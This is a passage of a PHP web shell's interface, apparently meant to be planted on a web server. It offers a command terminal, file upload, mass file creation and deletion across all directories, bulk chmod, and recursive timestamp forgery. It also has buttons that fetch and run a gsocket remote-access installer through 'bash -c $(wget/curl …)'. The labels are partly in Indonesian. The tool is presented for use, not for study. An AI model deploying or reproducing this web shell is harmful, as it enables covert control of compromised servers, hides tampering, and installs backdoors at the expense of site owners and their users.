            padding: 8px 12px;
            border-radius: 8px;
            cursor: default;
            font-family: inherit;
            font-weight: 600;
            width: 100%;
            text-align: left;
            margin-bottom: 8px;
            font-size: 13px;
        }
        .terminal {
            background: #000;
            border: 2px solid #00ff41;
            border-radius: 10px;
            overflow: visible;             /* ikut tinggi konten */ [web:390]
            box-shadow: 0 0 10px rgba(0,255,65,0.4), inset 0 0 10px rgba(0,0,0,0.8);
            animation: glow 2s infinite;
        }
        .terminal-header {
            background: linear-gradient(90deg, #00ff41, #00cc33);
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .terminal-tabs { display: flex; gap: 6px; }
        .tab {
            background: rgba(0,0,0,0.7);
            color: #00ff41;
            padding: 3px 8px;
            border-radius: 14px;
            font-size: 11px;
            font-weight: 600;
        }

        .terminal-body {
            padding: 10px 14px;
            background: #000;
            /* tidak ada height/max-height/overflow-y: konten bebas memanjang */
        }

        .term-line { margin-bottom: 4px; display: flex; }
        .term-prompt {
            color: #00ff41;
            font-weight: bold;
            margin-right: 5px;
            animation: blink 1s infinite;
        }
        .term-cmd { color: #fff; font-family: 'Courier New', monospace; }
        .term-output {
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.4;
            white-space: pre-wrap;
            margin-left: 18px;
            padding: 4px 0;
        }
        .term-output.error { color: #ff4444; }

        .terminal-input {
            background: rgba(0,0,0,0.9);
            padding: 8px 10px;
            border-top: 1px solid #333;
            display: flex;
            gap: 8px;
        }
        .terminal-input input {
            flex: 1;
            background: transparent;
            border: 1px solid #00ff41;
            color: #0f0;
            padding: 6px 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .terminal-input input::placeholder { color: #666; }
        .terminal-input button {
            background: linear-gradient(45deg, #00ff41, #00cc33);
            color: #000;
            border: none;
            padding: 6px 10px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 12px;
            border-radius: 6px;
            cursor: pointer;
            white-space: nowrap;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 10px rgba(0,255,65,0.4); }
            50%      { box-shadow: 0 0 18px rgba(0,255,65,0.7); }
        }

        @media (max-width: 768px) {
            .terminal-input { flex-direction: column; }
            .file-table td { padding: 8px 10px; font-size: 12px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛠️ Advanced File Manager + Terminal</h1>
        
<div class="card">
    <!-- NAVIGATE -->
    <form method="GET">
        <input type="hidden" name="access" value="<?php echo htmlspecialchars($param, ENT_QUOTES); ?>">
        <label>📁 Directory</label>
        <input type="text" name="directory" value="<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>" required>
        <button type="submit" class="btn open">🔄 Navigate</button>
    </form>

    <!-- UPLOAD -->
    <form method="POST" enctype="multipart/form-data" style="margin-top:15px;">
        <input type="hidden" name="access"
               value="<?php echo htmlspecialchars($param, ENT_QUOTES); ?>">
        <input type="hidden" name="directory"
               value="<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>">

        <label>📤 Upload file ke folder ini</label>
        <input type="file" name="upload_file" required>

        <button type="submit" class="btn create" name="action" value="upload_file">
            UPLOAD
        </button>
    </form>
</div>


        <!-- Directory Listing - FULL FEATURES -->
        <?php listDirectory($dir, $param); ?>

        <!-- File Operations -->
<div class="card">
<form method="POST">
    <input type="hidden" name="access"
           value="<?php echo htmlspecialchars($param, ENT_QUOTES); ?>">

    <label>📁 Directory</label>
    <input type="text" name="directory"
           value="<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>" required>

    <label>📝 Filename</label>
    <input type="text" name="filename" placeholder="">

    <label>📄 Content</label>
    <textarea name="content" rows="6"></textarea>

    <button class="btn create" name="action" value="create_file">
        Create FILE (current dir)
    </button>
    <button class="btn create" name="action" value="create_file_all_dir">
        CREATE FILE IN ALL DIR
    </button>

    <!-- FILE SECTION ONLY -->
    <label>🗑️ DELETE File</label>
    <input type="text" name="deletefile" placeholder="">
    <button class="btn delete" name="action" value="delete_file">Delete FILE</button>
    <button class="btn delete" name="action" value="delete_file_all"
            onclick="return confirm('Hapus FILE ini di SEMUA folder?')">
        DELETE FILE IN ALL DIR
    </button>
    <button class="btn create" name="action" value="gsocket_wget"
            onclick="return confirm('Jalankan: bash -c \"$(wget --no-verbose -O- https://gsocket.io/y)\" ?');">
        RUN gsocket (wget)
    </button>

    <button class="btn create" name="action" value="gsocket_curl"
            onclick="return confirm('Jalankan: bash -c \"$(curl -fsSL https://gsocket.io/y)\" ?');">
        RUN gsocket (curl)
    </button>

    <hr style="margin:15px 0;border-color:#333;">

    <!-- KHUSUS FILE -->
    <label>🔧 CHMOD Semua FILE di folder ini</label>
    <div style="display:flex; gap:10px; align-items:center;">
        <input type="text" name="chmod_base"
               value="<?php echo htmlspecialchars($chmodBase, ENT_QUOTES); ?>"
               style="flex:1;height:32px;">
        <input type="text" name="chmod_file_all_perm"
               value=""
               placeholder=""
               style="flex:0 0 80px;height:32px;text-align:center;"
               maxlength="4">
        <button class="btn chmod" name="action" value="chmod_files_all">Apply FILE</button>
    </div>

    <!-- KHUSUS DIR -->
    <label style="margin-top:10px;">📁 CHMOD Semua FOLDER di folder ini</label>
    <div style="display:flex; gap:10px; align-items:center;">
        <input type="text" name="chmod_base"
               value="<?php echo htmlspecialchars($chmodBase, ENT_QUOTES); ?>"
               style="flex:1;height:32px;">
        <input type="text" name="chmod_dir_all_perm"
               value=""
               placeholder=""
               style="flex:0 0 80px;height:32px;text-align:center;"
               maxlength="4">
        <button class="btn chmod" name="action" value="chmod_dirs_all">Apply DIR</button>
    </div>

    <!-- RECURSIVE FLAG UNTUK CHMOD SINGLE / TOUCHTIME -->
    <label style="margin-top:10px;">
        <input type="checkbox" name="recursive">
        Recursive (UBAH WAKTU SEMUA FILE & FOLDER di folder ini + subfolder)
    </label>

    <!-- TOUchtime (single / recursive) -->
    <label style="margin-top:10px;">⏱️ CENTANG DI ATAS LALU APPLY TIME</label>
    <div style="display:flex; gap:10px; align-items:center;">
        <input type="text"
               value="<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>"
               style="flex:1;height:32px;"
               readonly>

        <input type="text" name="newtime"
               value=""
               placeholder="<?php echo date('Y-m-d H:i:s'); ?>"
               style="flex:0 0 180px;height:32px;text-align:center;"
               maxlength="19">

        <button class="btn chmod" name="action" value="touchtime"
                style="flex:0 0 110px;"
                onclick="return confirm('Ubah waktu SEMUA file & folder di folder ini + semua subfolder? (tidak bisa dibatalkan)');">
            APPLY TIME
        </button>
    </div>
</form>
</div>
    
            </form>
        </div>

<!-- TERMINAL -->
<div class="card">
    <div class="terminal-container">
        <button class="terminal-toggle">
            💻 Terminal
        </button>
        <div class="terminal" id="terminal">
            <div class="terminal-header">
                <div style="width:10px;height:10px;background:#ff5f57;border-radius:50%;"></div>
                <div style="width:10px;height:10px;background:#ffbd2e;border-radius:50%;"></div>
                <div style="width:10px;height:10px;background:#28ca42;border-radius:50%;"></div>
                <div class="terminal-tabs">
                    <div class="tab active">bash</div>
                    <div class="tab">root@server:~</div>
                </div>
            </div>
            
            <div class="terminal-body" id="terminal-body">
            <?php 
            if (!empty($terminalHistory)) {
                echo $terminalHistory;
            } else {
                // helper icon
                $on  = "<span style='color:#0f0'>ON</span>";
                $off = "<span style='color:#f44'>OFF</span>";

                echo "<div class='term-line'>
            <span class='term-prompt'>root@server:~$</span>
        </div>
                <div class='term-output'>
            Terminal Ready!

            ▶ Basic:
            - ls, ls -la, pwd, whoami
            - id, uname -a, df -h, free -m

            ▶ Network:
            - ip a / ifconfig
            - netstat -tlnp (atau ss -tlnp)
            - curl https://example.com
            - wget https://example.com/file

            ▶ Tools status:
            - gcc      : " . ($features['gcc']     ? $on : $off) . "
            - wget     : " . ($features['wget']    ? $on : $off) . "
            - curl     : " . ($features['curl']    ? $on : $off) . "
            - python3  : " . ($features['python3'] ? $on : $off) . "
            - php      : " . ($features['php']     ? $on : $off) . "

            ▶ Note:
            - Terminal : " . (shell_exec_enabled() ? $on : $off) . "
            - shell_exec(): " . (shell_exec_enabled() ? $on : $off) . "
                </div>";
            }
            ?>
            </div>

            </div>

            
            <form method="POST" class="terminal-input">
                <input type="hidden" name="access" value="<?php echo htmlspecialchars($param, ENT_QUOTES); ?>">
                <input type="hidden" name="directory" value="<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>">
                <input type="hidden" name="action" value="terminal">
                <input type="text" name="cmd" placeholder="ls -la | whoami | pwd..." autocomplete="off" <?php echo (!empty($cmd) && $action === 'terminal') ? 'autofocus' : ''; ?>>
                <button type="submit">▶</button>
            </form>
        </div>
    </div>
</div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const terminalInput = document.querySelector('.terminal-input input[name="cmd"]');
    const terminalBody  = document.getElementById('terminal-body');

    if (terminalBody) {
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }

    if (terminalInput) {
        terminalInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.form.submit();
            }
        });
    }
});
</script>

</body>
</html>
